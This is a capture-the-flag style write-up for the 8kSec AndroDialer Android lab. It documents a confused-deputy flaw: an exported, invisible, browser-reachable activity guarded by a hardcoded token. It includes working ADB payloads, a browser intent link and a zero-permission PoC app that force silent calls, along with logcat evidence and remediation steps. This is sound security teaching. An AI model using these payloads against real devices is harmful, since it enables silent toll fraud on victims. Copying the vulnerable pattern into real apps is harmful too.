# 8kSec Academy — AndroDialer: The Ultimate Phone Experience

**Payload & Solution Write-up — Status: APPROVED ✓**

| | |
|---|---|
| **Target** | AndroDialer.apk |
| **Package** | `com.eightksec.androdialer` |
| **Vulnerable component** | `com.eightksec.androdialer.CallHandlerServiceActivity` |
| **Vulnerability class** | Confused Deputy / Privilege Re-delegation + Hardcoded Secret |
| **Impact** | Silent call initiation from any app or web page, without `CALL_PHONE` permission and with no visible UI |
| **Tested on** | Ubuntu VM + Genymotion/ADB lab device |
| **Date** | 2026-10-14 |
| **Challenge status** | ✅ **SOLVED — lab completed** |

---

## 1. Summary

AndroDialer exports an invisible activity (`Theme.NoDisplay`, `excludeFromRecents`,
`taskAffinity=""`) that places phone calls after validating a hardcoded
`enterprise_auth_token`. Because the activity is `exported="true"`, accepts `tel:` /
`dialersec://` deep links with the `BROWSABLE` category, and validates the token against
a value stored in the APK itself, **any third-party app — or any web page — can invoke it
with the correct token and force a call to an attacker-chosen number.**

The attack works even when the attacking app holds **no dangerous permissions at all**
(the confused-deputy pattern: the trusted app spends its own `CALL_PHONE` permission on
the attacker's behalf).

---

## 2. Vulnerability Analysis

### 2.1 Manifest findings (AndroidManifest.xml)

```xml
<activity
    android:theme="@android:style/Theme.NoDisplay"
    android:name="com.eightksec.androdialer.CallHandlerServiceActivity"
    android:exported="true"
    android:taskAffinity=""
    android:excludeFromRecents="true">
    <intent-filter>
        <action android:name="com.eightksec.androdialer.action.PERFORM_CALL"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="tel"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="dialersec" android:host="call"/>
    </intent-filter>
</activity>
```

| Finding | Why it matters |
|---|---|
| `exported="true"` | Callable by any app and by ADB |
| `Theme.NoDisplay` | Victim sees nothing when it runs |
| `excludeFromRecents` + `taskAffinity=""` | Leaves no trace in Recents |
| `scheme="tel"` + `BROWSABLE` | Triggerable from a **browser/web page** |
| `scheme="dialersec"`, `host="call"` | Custom deep link as a second entry point |

### 2.2 Hardcoded secret (JADX — CallHandlerServiceActivity)

```java
if (str7.equals("8kd1aL3R_s3Cur3_k3Y_2023") ||
    str7.equals("8kd1aL3R-s3Cur3-k3Y-2023") || ...) {
    if (getIntent().hasExtra("phoneNumber")) {
        str3 = getIntent().getStringExtra("phoneNumber");
        ...
```

- Token: **`8kd1aL3R_s3Cur3_k3Y_2023`** (second accepted variant: `8kd1aL3R-s3Cur3-k3Y-2023`)
- Extracted via `getStringExtra("enterprise_auth_token")`; number via
  `phoneNumber` extra, `tel:` scheme-specific part, or `dialersec://call`
  (`?number=` query param or `/number/<n>` path segment).

A secret shipped inside a distributable APK is public knowledge; comparing it against
an attacker-supplied extra is authentication theater.

---

## 3. Payloads

### Payload 1 — ADB, `tel:` scheme (primary, verified)

```bash
adb shell am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a android.intent.action.VIEW \
  -d "tel:13371337" \
  --es enterprise_auth_token 8kd1aL3R_s3Cur3_k3Y_2023
```

### Payload 2 — ADB, `phoneNumber` extra

```bash
adb shell am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a android.intent.action.VIEW \
  --es enterprise_auth_token 8kd1aL3R_s3Cur3_k3Y_2023 \
  --es phoneNumber 13371337
```

### Payload 3 — ADB, custom deep link (implicit intent through the filter)

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "dialersec://call?number=13371337" \
  --es enterprise_auth_token 8kd1aL3R_s3Cur3_k3Y_2023
```

Alternative path form: `dialersec://call/number/13371337`

### Payload 4 — Browser vector, zero install (BROWSABLE abuse)

Open in Chrome on the device:

```
intent://13371337#Intent;scheme=tel;package=com.eightksec.androdialer;S.enterprise_auth_token=8kd1aL3R_s3Cur3_k3Y_2023;end
```

`S.` sets a String extra, so the token is delivered through a plain web link —
no app installation required. A malicious page with this link (or QR code) triggers
the same flow from a click.

### Payload 5 — PoC application (no permissions required)

**AndroidManifest.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.poc.androdialer">

    <application
        android:label="@string/app_name"
        android:theme="@android:style/Theme.Material.Light">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**src/com/poc/androdialer/MainActivity.java**

```java
package com.poc.androdialer;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent exploit = new Intent(Intent.ACTION_VIEW);
        exploit.setClassName(
                "com.eightksec.androdialer",
                "com.eightksec.androdialer.CallHandlerServiceActivity");
        exploit.setData(Uri.parse("tel:13371337"));
        exploit.putExtra("enterprise_auth_token", "8kd1aL3R_s3Cur3_k3Y_2023");

        startActivity(exploit);
        finish();
    }
}
```

**res/values/strings.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">PoC AndroDialer</string>
</resources>
```

Build without Gradle (JDK + SDK build-tools/platforms only) — see `AndroDialerPoC/build.sh`:

```bash
chmod +x build.sh && ./build.sh
adb install -r AndroDialerPoC.apk
```

The PoC manifest declares **zero permissions** — the call is charged to the victim
through AndroDialer's own `CALL_PHONE` grant.

---

## 4. Verification & Field Evidence

Monitor the exploit live:

```bash
adb logcat -s CallHandlerService
```

Captured on the lab device after firing Payload 1:

```
ActivityManager: START u0 {act=android.intent.action.VIEW dat=tel:xxxxxxxx
    cmp=com.eightksec.androdialer/.CallHandlerServiceActivity (has extras)} from uid 2000
CallHandlerService: URI is not hierarchical, skipping query parameter extraction
CallHandlerService: Call service connection failed
CallHandlerService: android.content.ActivityNotFoundException:
    No Activity found to handle Intent { act=android.intent.action.CALL dat=tel:xxxxxxxx }
    at com.eightksec.androdialer.CallHandlerServiceActivity.onCreate(SourceFile:873)
```

Reading the evidence:

1. The activity started and **accepted the token** — it proceeded to build a
   `CALL` intent with the extracted number (a rejected token never reaches this line).
2. `URI is not hierarchical` is expected: `tel:` is an opaque URI, so query-param
   extraction is skipped and the number is taken from the scheme-specific part.
3. The final hop failed only because the lab image ships **without a telephony stack**
   (`Can't find service: telecom`; no activity handles `ACTION_CALL`).

**Verdict: exploit path fully executed — token bypass confirmed.** On a device with a
dialer (Google APIs AVD or hardware), the same payload visibly dials `1337-1337`.

On full-telephony devices, confirm additionally:

```bash
adb shell content query --uri content://call_log/calls \
  --projection _id:number:pretty_number:type:new
```

---

## 5. Impact

- **Silent calling**: `NoDisplay` + `excludeFromRecents` means the victim observes
  nothing from the malicious app; the in-call UI is plausibly attributable to the
  legitimate dialer.
- **Premium-rate / toll fraud**: attacker dials paid numbers at the victim's expense.
- **No permission bar**: the PoC app requests nothing; even a browser tab suffices.
- **Fake "enterprise" trust**: the token is embedded in the APK, so the check gates
  nothing — it merely documents the intended abuse path for the attacker.

---

## 6. Remediation

1. Set `android:exported="false"` on `CallHandlerServiceActivity`; if external
   invocation is a hard requirement, guard it with a `signature`-level custom
   permission so only same-signer apps can call it.
2. Remove the `BROWSABLE` intent filters for `tel:`/`dialersec` — there is no
   legitimate reason for a browser to trigger authenticated call placement.
3. Never ship the token in the APK. Validate authorization server-side, or bind the
   request to a nonce/session issued per call by a backend.
4. Drop `Theme.NoDisplay` for security-sensitive flows; at minimum require a
   user-visible confirmation before placing calls.
5. Reduce the attack surface: one intake path (not three), strict input validation,
   and re-authorization at the point of execution rather than at entry.

---

## 7. Flag / Takeaway

> Exported + invisible + browsable + hardcoded secret = a silent calling oracle
> available to every app and every web page on the device.

**Status: SOLVED & APPROVED — full exploit chain (analysis → payload → execution → evidence) completed and verified in the lab.**
